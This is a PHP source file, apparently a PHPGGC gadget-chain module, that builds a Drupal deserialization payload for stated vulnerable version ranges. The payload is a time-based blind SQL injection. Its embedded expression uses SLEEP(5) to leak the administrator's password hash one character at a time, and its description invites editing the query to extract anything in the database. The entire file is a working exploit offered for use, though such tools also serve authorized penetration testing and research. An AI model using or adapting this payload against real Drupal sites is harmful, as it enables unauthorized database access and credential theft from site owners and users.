<?php

namespace GadgetChain\Drupal;

class SQLI2 extends \PHPGGC\GadgetChain\SQLI\MySQLUnauthenticatedSQLI
{
    public static $version = '>= 8.0.0 < 10.5.9 || >= 10.6.0 < 10.6.7 || >= 11.0.0 < 11.2.11 || >= 11.3.0 < 11.3.7';
    public static $vector = '__wakeup';
    public static $author = 'hsw109';
    public static $information = 'Advisory: https://www.drupal.org/sa-core-2026-002
    Time-based SQLI to directly extract anything in database, change the $expression query below on purpose';

    public function generate(array $parameters)
    {

        $condition = new \Drupal\Core\Database\Query\Condition([
                                '#conjunction' => 'AND',
                                [
                                    'field' => 'uid',
                                    'value' => 1,
                                    'operator' => '=',
                                ],
                            ]);

        $having = new \Drupal\Core\Database\Query\Condition([
                                '#conjunction' => 'AND',
                                [
                                    'field' => 'uid',
                                    'value' => 1,
                                    'operator' => '=',
                                ],
                            ]);
        $having->goBlank();

        $selectObj = new \Drupal\Core\Database\Query\Select(
                            $condition,
                            $having,
                            [
                                'u' => [
                                    'table' => 'users_field_data',
                                    'alias' => 'u',
                                    'all_fields' => true,
                                ]
                            ],
                            [
                                'e' => [
                                    'expression' => 'IF(ASCII(SUBSTRING((SELECT pass FROM {users_field_data} WHERE uid=1 LIMIT 1),1, 1)) > 0 , SLEEP(5), 0)',
                                    'alias' => 'e',
                                    'arguments' => []
                                ]
                            ]

                    );
        return (
            new \Drupal\views\ViewExecutable(
                new \Drupal\views\Plugin\views\query\Sql(),
                new \Drupal\views\Plugin\views\pager\None(),
                [
                        'query' => $selectObj,
                        'count_query' => $selectObj,
                ]
            )
        );
    }
}
